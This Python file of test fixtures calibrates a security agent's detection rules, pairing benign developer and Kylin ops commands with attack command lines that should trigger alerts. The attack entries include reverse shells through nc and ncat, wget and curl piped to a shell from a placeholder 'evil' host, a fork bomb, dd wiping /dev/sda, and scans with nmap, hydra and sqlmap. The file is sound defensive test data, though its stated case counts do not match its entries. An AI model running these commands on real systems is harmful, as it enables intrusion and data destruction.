"""日常/开发风险演练用例库 — 用于校准检测规则、降低误报、提高准确率."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass(frozen=True)
class DetectionFixture:
    id: str
    category: str
    title: str
    process_name: str
    cmdline: str
    expect_risk: bool
    note: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "category": self.category,
            "title": self.title,
            "process_name": self.process_name,
            "cmdline": self.cmdline,
            "expect_risk": self.expect_risk,
            "note": self.note,
        }


FIXTURE_CATEGORIES: dict[str, str] = {
    "daily_dev": "日常开发（应安全）",
    "ci_automation": "CI/脚本自动化（应安全）",
    "false_positive_guard": "易误报场景（应安全）",
    "kylin_ops": "银河麒麟运维（应安全）",
    "attack_process": "攻击工具进程（应告警）",
    "attack_cmdline": "危险命令行（应告警）",
    "edge_case": "边界/混合场景",
}


def _f(
    id: str,
    category: str,
    title: str,
    process_name: str,
    cmdline: str,
    expect_risk: bool,
    note: str = "",
) -> DetectionFixture:
    return DetectionFixture(id, category, title, process_name, cmdline, expect_risk, note)


# 60 条检测校准用例：约 34 条应不告警 + 22 条应告警 + 4 条边界
DETECTION_FIXTURES: tuple[DetectionFixture, ...] = (
    # --- daily_dev (16) ---
    _f("DD-01", "daily_dev", "Streamlit 控制台", "streamlit", "streamlit run streamlit_app.py --server.port 8501", False),
    _f("DD-02", "daily_dev", "uv 运行 Agent", "python3", "uv run python -m security_agent.mcp.server", False),
    _f("DD-03", "daily_dev", "Node 前端", "node", "node /app/server.js --port 3000", False),
    _f("DD-04", "daily_dev", "Docker Compose", "docker", "docker compose up -d", False),
    _f("DD-05", "daily_dev", "Git 拉取", "git", "git pull origin main", False),
    _f("DD-06", "daily_dev", "PostgreSQL", "postgres", "postgres -D /var/lib/postgresql/data", False),
    _f("DD-07", "daily_dev", "Nginx", "nginx", "nginx: master process /usr/sbin/nginx", False),
    _f("DD-08", "daily_dev", "Java 应用", "java", "java -jar /opt/app/service.jar", False),
    _f("DD-09", "daily_dev", "pytest", "python3", "python -m pytest tests/ -q", False),
    _f("DD-10", "daily_dev", "pip 安装", "python3", "python -m pip install -r requirements.txt", False),
    _f("DD-11", "daily_dev", "gcc 编译", "gcc", "gcc -O2 -o main main.c", False),
    _f("DD-12", "daily_dev", "make 构建", "make", "make -j8", False),
    _f("DD-13", "daily_dev", "Redis", "redis-server", "redis-server /etc/redis/redis.conf", False),
    _f("DD-14", "daily_dev", "启动脚本", "bash", "bash /home/user/security-agent/boot_start.sh", False),
    _f("DD-15", "daily_dev", "VS Code/Cursor", "node", "node /usr/share/cursor/resources/app/out/cli.js", False),
    _f("DD-16", "daily_dev", "curl 下载（无管道执行）", "curl", "curl -fsSL https://example.com/install.sh -o /tmp/install.sh", False),
    # --- ci_automation (6) ---
    _f("CI-01", "ci_automation", "冒烟测试", "python3", "python scripts/smoke_test.py", False),
    _f("CI-02", "ci_automation", "演练 CLI", "python3", "python scripts/demo_risk.py boundary", False),
    _f("CI-03", "ci_automation", "MCP Server", "python3", "python -m security_agent.mcp.server", False),
    _f("CI-04", "ci_automation", "ruff 检查", "python3", "python -m ruff check security_agent/", False),
    _f("CI-05", "ci_automation", "npm ci", "npm", "npm ci --prefer-offline", False),
    _f("CI-06", "ci_automation", "systemctl status", "systemctl", "systemctl status streamlit-agent", False),
    # --- false_positive_guard (14) ---
    _f("FP-01", "false_positive_guard", "系统 sync 进程", "sync", "sync", False, "进程名含 nc 子串但为系统 sync"),
    _f("FP-02", "false_positive_guard", "systemd", "systemd", "/usr/lib/systemd/systemd --user", False),
    _f("FP-03", "false_positive_guard", "announce 单词", "python3", "python -c print(announce)", False),
    _f("FP-04", "false_positive_guard", "路径含 nmap 字样", "cat", "cat /docs/nmap-deployment-guide.md", False),
    _f("FP-05", "false_positive_guard", "grep 日志中的 nmap", "grep", "grep -i nmap /var/log/auth.log", False, "只读检索关键字"),
    _f("FP-06", "false_positive_guard", "egrep 多关键字", "egrep", "egrep 'error|nmap|ssh' /var/log/syslog", False),
    _f("FP-07", "false_positive_guard", "head 查看含工具名日志", "head", "head -n 50 /tmp/scan_nmap_output.log", False),
    _f("FP-08", "false_positive_guard", "演练诱饵 decoy", "python3", "python security_agent/demo/decoy.py --hold --simulate-tool nmap", False),
    _f("FP-09", "false_positive_guard", "find 源码", "find", "find . -name '*.py' -path './security_agent/*'", False),
    _f("FP-10", "false_positive_guard", "sshd 守护", "sshd", "sshd: /usr/sbin/sshd -D", False),
    _f("FP-11", "false_positive_guard", "denyhosts 非 hydra", "python3", "python /opt/denyhosts/daemon.py", False),
    _f("FP-12", "false_positive_guard", "increment 变量", "bash", "bash -c 'INCREMENT=1; echo ok'", False),
    _f("FP-13", "false_positive_guard", "连接池类名", "java", "java com.example.ConnectionPoolMain", False),
    _f("FP-14", "false_positive_guard", "awk 解析日志", "awk", "awk '/nmap/{print}' /var/log/messages", False),
    # --- kylin_ops (5) ---
    _f("KY-01", "kylin_ops", "apt 更新", "apt", "apt-get update", False),
    _f("KY-02", "kylin_ops", "journalctl", "journalctl", "journalctl -u ssh -n 50", False),
    _f("KY-03", "kylin_ops", "pkexec 查询", "pkexec", "pkexec --version", False),
    _f("KY-04", "kylin_ops", "银河麒麟版本", "cat", "cat /etc/kylin-release", False),
    _f("KY-05", "kylin_ops", "df 磁盘", "df", "df -hT", False),
    # --- attack_process (12) ---
    _f("AT-01", "attack_process", "nmap 扫描", "nmap", "nmap -sS 192.168.1.0/24", True),
    _f("AT-02", "attack_process", "nc 监听", "nc", "nc -lvp 4444", True),
    _f("AT-03", "attack_process", "ncat", "ncat", "ncat -e /bin/bash 10.0.0.1 4444", True),
    _f("AT-04", "attack_process", "masscan", "masscan", "masscan 10.0.0.0/8 -p1-65535", True),
    _f("AT-05", "attack_process", "hydra 爆破", "hydra", "hydra -l admin -P pass.txt ssh://target", True),
    _f("AT-06", "attack_process", "sqlmap", "sqlmap", "sqlmap -u http://vuln.site?id=1", True),
    _f("AT-07", "attack_process", "metasploit", "metasploit", "metasploit-framework console", True),
    _f("AT-08", "attack_process", "msfconsole", "msfconsole", "msfconsole -q", True),
    _f("AT-09", "attack_process", "python 调用 nmap", "python3", 'python3 -c "import os; os.execlp(\'nmap\',\'nmap\',\'-sn\',\'10.0.0.1\')"', True),
    _f("AT-10", "attack_process", "bash 下 nmap", "bash", "bash -c 'nmap -Pn target.local'", True),
    _f("AT-11", "attack_process", "隐蔽 nc 参数", "python3", "python3 /tmp/run.py --use nc -l 8080", True),
    _f("AT-12", "attack_process", "wget 管道 shell", "bash", "bash -c 'wget -qO- http://evil/a.sh | sh'", True),
    # --- attack_cmdline (6) ---
    _f("AC-01", "attack_cmdline", "rm -rf", "bash", "bash -c 'rm -rf /tmp/foo'", True),
    _f("AC-02", "attack_cmdline", "chmod 777", "bash", "bash -c 'chmod 777 /etc/passwd'", True),
    _f("AC-03", "attack_cmdline", "fork 炸弹", "bash", ":(){ :|:& };:", True),
    _f("AC-04", "attack_cmdline", "curl 管道 bash", "bash", "curl http://evil/x | bash", True),
    _f("AC-05", "attack_cmdline", "dd 写盘", "bash", "dd if=/dev/zero of=/dev/sda", True),
    _f("AC-06", "attack_cmdline", "反向 shell nc", "sh", "sh -c 'nc 203.0.113.9 4444 -e /bin/sh'", True),
    # --- edge_case (7) ---
    _f("EC-01", "edge_case", "直接 nmap 非 grep", "nmap", "nmap -sn localhost", True),
    _f("EC-02", "edge_case", "python http.server", "python3", "python -m http.server 8080", False),
    _f("EC-03", "edge_case", "docker redis", "docker", "docker run redis:7", False),
    _f("EC-04", "edge_case", "sed 替换 nmap 文本", "sed", "sed 's/nmap/NMAP/g' config.txt", False),
    _f("EC-05", "edge_case", "非官方诱饵路径", "python3", "python /tmp/fake/decoy.py --simulate-tool nmap", True),
    _f("EC-06", "edge_case", "help 字符串 masscan", "python3", 'python -c "help(\'masscan\')"', False),
    _f("EC-07", "edge_case", "ss 网络查看", "ss", "ss -tlnp", False),
)
